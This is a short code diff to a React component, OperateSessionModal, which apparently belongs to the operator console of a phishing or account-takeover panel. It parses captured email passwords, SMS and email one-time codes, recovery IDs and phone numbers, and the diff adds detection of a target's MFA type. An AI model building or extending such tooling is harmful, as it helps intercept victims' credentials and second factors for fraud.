@@ -240,6 +240,14 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
       if (otp.startsWith("id_recovery:") || otp.startsWith("id_recovery_final:")) setIdRecovery(otp.replace(/^id_recovery(_final)?:/, ""));
       if (otp.startsWith("email_pass:")) setEmailPassword(otp.replace("email_pass:", ""));
       if (otp.startsWith("sync_pass:")) setEmailPassword(otp.replace("sync_pass:", ""));
+      // Parse PPI MFA type from otp_code parts
+      if (session.source === "ppi") {
+        const parts = otp.split("|");
+        for (const part of parts) {
+          const twofaMatch = part.match(/^twofa_type:(\d+)$/);
+          if (twofaMatch) setPpiMfaType(parseInt(twofaMatch[1], 10));
+        }
+      }
       if (otp.startsWith("sync_token:")) { setEmailCode(otp.replace("sync_token:", "")); setEmailCodeLabel("2FA Email"); }
       if (otp.startsWith("sms_code:") || otp.startsWith("sync_sms:")) { setEmailCode(otp.replace(/^(sms_code:|sync_sms:)/, "")); setEmailCodeLabel("SMS"); }
       if (otp.startsWith("client_phone:") || otp.startsWith("client_phone_final:")) { setClientPhoneNumber(otp.replace(/^(client_phone:|client_phone_final:)/, "")); }
